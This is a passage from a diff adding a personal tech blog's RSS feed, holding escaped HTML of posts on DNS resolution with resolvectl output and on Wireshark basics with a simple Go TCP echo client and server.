+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $ systemd-resolve --status | grep &amp;#34;DNS Servers&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# In systemd 239 &amp;#39;systemd-resolve&amp;#39; has been renamed to &amp;#39;resolvectl&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ resolvectl status | grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DNS Servers&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       DNS Servers: 172.31.0.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ resolvectl status
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Global
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       Protocols: -LLMNR -mDNS -DNSOverTLS DNSSEC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no/unsupported
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;resolv.conf mode: stub
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Link &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;eth0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Current Scopes: DNS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;         Protocols: +DefaultRoute +LLMNR -mDNS -DNSOverTLS DNSSEC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;no/unsupported
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Current DNS Server: 172.31.0.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       DNS Servers: 172.31.0.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        DNS Domain: us-east-2.compute.internal
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;DNS stub resolver&lt;/strong&gt;&lt;/em&gt; used to initiate DNS queries, and it sends the DNS query to the &lt;strong&gt;recursive resolver&lt;/strong&gt;, which then performs the actual DNS resolution process (usually provided by an internet service provider or a public DNS resolver like Google&amp;rsquo;s 8.8.8.8).&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;References: &lt;a href=&#34;https://zhuanlan.zhihu.com/p/101275725&#34;&gt;https://zhuanlan.zhihu.com/p/101275725&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Wireshark Basics</title>
+      <link>https://blog.jiyi27.com/posts/networking/001-wireshark/</link>
+      <pubDate>Wed, 13 Sep 2023 16:52:30 +0000</pubDate>
+      
+      <guid>https://blog.jiyi27.com/posts/networking/001-wireshark/</guid>
+      <description>&lt;h2 id=&#34;1-structure&#34;&gt;1. Structure&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.jiyi27.com/001-wireshark/aaa.png&#34; alt=&#34;a&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-capture-filter&#34;&gt;2. Capture filter&lt;/h2&gt;
+&lt;h3 id=&#34;21-selcet-netowk-interface&#34;&gt;2.1. Selcet netowk interface&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;en0&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;Physical network interface&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;utun0~4
+&lt;ul&gt;
+&lt;li&gt;VIrtual netwrok interface used for tunneling, learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/007-tun-device-macos/&#34;&gt;Working with TUN Device on MacOS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;loopback interface: 127.0.0.1
+&lt;ul&gt;
+&lt;li&gt;When you run a echo server and client on your local machine, you should select the &lt;code&gt;loopback&lt;/code&gt; interface, not the &lt;code&gt;en0&lt;/code&gt; interface.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;22-specify-filter-rules&#34;&gt;2.2. Specify filter rules&lt;/h3&gt;
+&lt;p&gt;Filter by port and protocol:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wireshark can only capture some specific ports that for HTTP package by default, so if you gonna capture HTTP package, make sure use the correct ports or goto settings to change the default ports. If you ignore this, like to capture HTTP on port 9000, you probably jut get TCP package.&lt;/p&gt;</description>
+      <content>&lt;h2 id=&#34;1-structure&#34;&gt;1. Structure&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.jiyi27.com/001-wireshark/aaa.png&#34; alt=&#34;a&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2-capture-filter&#34;&gt;2. Capture filter&lt;/h2&gt;
+&lt;h3 id=&#34;21-selcet-netowk-interface&#34;&gt;2.1. Selcet netowk interface&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;en0&lt;/code&gt;
+&lt;ul&gt;
+&lt;li&gt;Physical network interface&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;utun0~4
+&lt;ul&gt;
+&lt;li&gt;VIrtual netwrok interface used for tunneling, learn more: &lt;a href=&#34;https://davidzhu.xyz/post/networking/007-tun-device-macos/&#34;&gt;Working with TUN Device on MacOS - David&amp;rsquo;s Blog&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;loopback interface: 127.0.0.1
+&lt;ul&gt;
+&lt;li&gt;When you run a echo server and client on your local machine, you should select the &lt;code&gt;loopback&lt;/code&gt; interface, not the &lt;code&gt;en0&lt;/code&gt; interface.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;22-specify-filter-rules&#34;&gt;2.2. Specify filter rules&lt;/h3&gt;
+&lt;p&gt;Filter by port and protocol:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;port &lt;span style=&#34;color:#ae81ff&#34;&gt;9000&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wireshark can only capture some specific ports that for HTTP package by default, so if you gonna capture HTTP package, make sure use the correct ports or goto settings to change the default ports. If you ignore this, like to capture HTTP on port 9000, you probably jut get TCP package.&lt;/p&gt;
+&lt;p&gt;You can find the allowed HTTP port on &lt;code&gt;Preferences-&amp;gt;Protocols-&amp;gt;HTTP&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://wiki.wireshark.org/CaptureFilters&#34;&gt;CaptureFilters - Wireshark&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;3-display-filter&#34;&gt;3. Display filter&lt;/h2&gt;
+&lt;p&gt;Learn more: &lt;a href=&#34;https://wiki.wireshark.org/DisplayFilters&#34;&gt;DisplayFilters&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;4-practical-examples&#34;&gt;4. Practical examples&lt;/h2&gt;
+&lt;p&gt;Client:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Three-way handshake included this step&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Note that we&amp;#39;re connecting to port 9000 on the server,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// not use port 9000 to connect the server.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;net&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Dial&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:9000&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;couldn&amp;#39;t connect to the server: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make([]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// send data to server, the data will be copied into kernel space&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// and encapsulated into tcp segment -&amp;gt; ip packet -&amp;gt; ethernet frame&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Write&lt;/span&gt;([]byte(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Hi, I am Coco\n&amp;#34;&lt;/span&gt;)); &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;couldn&amp;#39;t send request: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Read data from server, the data are copied from kernel space&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// what happens in kernel space (network stack):&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// ethernet frame -&amp;gt; ip packet -&amp;gt; tcp segment&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// the data will be forwarded to this program.&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// If the connection is closed, return error: io.EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Read&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Fatalf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;couldn&amp;#39;t read server response: %v&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(string(&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;))
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt; = &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Server:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Obtain the port&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Sprintf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;:%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Args&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// Create a tcp listener on the given port&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;listener&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;net&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Listen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;tcp&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;port&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to create listener, err:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;os&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Exit&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;listening on %s\n&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;listener&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Addr&lt;/span&gt;())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#75715e&#34;&gt;// listen for new connections&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Three-way handshake included&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// this connection will be assigned a new port (different from the port this server is listening)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// for sending and receiving data&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;listener&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#a6e22e&#34;&gt;fmt&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Println&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to accept connection, err:&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// Pass an accepted connection to a handler goroutine&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;go&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handleConnection&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;func&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;handleConnection&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;net&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Conn&lt;/span&gt;) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;defer&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Close&lt;/span&gt;()
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; make([]&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// read client request data, same as client side&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#75715e&#34;&gt;// if the connection is closed, return error: io.EOF&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#a6e22e&#34;&gt;_&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;conn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Read&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;		&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;			&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;io&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;EOF&lt;/span&gt; {
